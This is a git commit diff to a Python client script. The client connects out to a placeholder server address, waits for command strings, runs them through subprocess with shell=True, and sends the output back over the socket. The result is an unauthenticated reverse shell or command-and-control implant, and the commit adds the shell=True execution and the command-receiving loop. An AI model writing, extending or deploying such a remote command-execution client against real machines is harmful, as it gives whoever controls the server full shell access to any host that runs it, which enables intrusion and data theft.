0a1ec6aee60ef7b37ab8e2ffabc9eae289347583
bucksnort2 <stevenisawesome42@gmail.com>
2023-07-20 09:16:21 -0600

    Update client.py
    The client can connect to the server.
    The client cannot receive commands yet.

--- client.py
+++ client.py
@@ -1,21 +1,8 @@
-#!/usr/bin/python3
-
 import socket
-import subprocess
 import os
-import random
 
-def get_random_port():
-    return random.randint(49152, 65535)
-
-def get_client_ip():
-    # Get the client's IP address using a simple socket connection to a public server
-    # Replace "8.8.8.8" with any public server IP you trust for this purpose
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    client_socket.connect(("8.8.8.8", 80))
-    client_ip = client_socket.getsockname()[0]
-    client_socket.close()
-    return client_ip
+SERVER_IP = "SERVER IP ADDRESS"
+SERVER_PORT = 12345 #Same port as specified in the server
 
 def execute_command(command):
     try:
@@ -27,7 +14,7 @@ def execute_command(command):
             error_output = error_output.decode("utf-8")
         else:
             # Linux handling
-            process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
             output = process.stdout.decode("utf-8")
             error_output = process.stderr.decode("utf-8")
 
@@ -40,31 +27,62 @@ def execute_command(command):
     except Exception as e:
         return str(e)
 
-def start_client():
-    client_port = get_random_port()
-    client_ip = get_client_ip()
+def main():
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client_socket.bind(("", 0))  # Let the system assign a random available port
+    client_socket.connect((SERVER_IP, SERVER_PORT))
+
+    # Get the client IP address and port for identification
+    client_ip = socket.gethostbyname(socket.gethostname())
+    client_port = client_socket.getsockname()[1]
+
+    # Send the client's assigned port to the server for identification
+    client_socket.sendall(f"{client_port}".encode())
+
+    print(f"Connected to server. Client IP: {client_ip}, Client port: {client_port}")
+
     try:
-        client_socket.bind(("", client_port))
-        client_socket.connect(("SERVER_IP_ADDRESS", SERVER_PORT)) # Replace SERVER_IP_ADDRESS with your server's IP address
-        print(f"Connected to server. Client IP: {client_ip}, Client port: {client_port}")
-
         while True:
-            conn, addr = client_socket.accept()
-            with conn:
-                data = conn.recv(4096).decode()
-                if not data:
-                    break
+            # Receive the assigned port and target name from the server
+            data = client_socket.recv(4096).decode()
+            if not data:
+                break
 
-                command = data.split()
-                if not command:
-                    continue
+            if data.lower() == "exit":
+                break
 
-                # Execute the command and get the result
-                result = execute_command(command)
+            # Terminate the loop if the server sends the termination signal
+            if ":" in data:
+                target_name, target_port = data.split(":")
+                target_name = target_name.strip().lower()
+                target_port = int(target_port.strip())
 
-                # Send the result back to the server
-                conn.send(result.encode())
+                print(f"Received assigned port {target_port} for target '{target_name}'")
+
+                # Connect to the target machine using the assigned port
+                target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                target_socket.connect((SERVER_IP, target_port))
+
+                # Process commands from the server (optional, you can remove this part if not needed)
+                while True:
+                    # Receive commands from the server
+                    command = target_socket.recv(4096).decode()
+                    if not command:
+                        break
+
+                    if command.lower() == "exit":
+                        break
+
+                    print(f"Received command '{command}' from the server for target '{target_name}'")
+
+                    # Execute the command and get the result
+                    result = execute_command(command)
+
+                    # Send the result back to the server
+                    target_socket.sendall(result.encode())
+
+                # Close the connection to the target machine
+                target_socket.close()
 
     except Exception as e:
         print(f"Error: {e}")
@@ -72,6 +90,4 @@ def start_client():
         client_socket.close()
 
 if __name__ == "__main__":
-    SERVER_PORT = 12345  # Replace with the actual port your server is running on
-    start_client()
-
+    main()
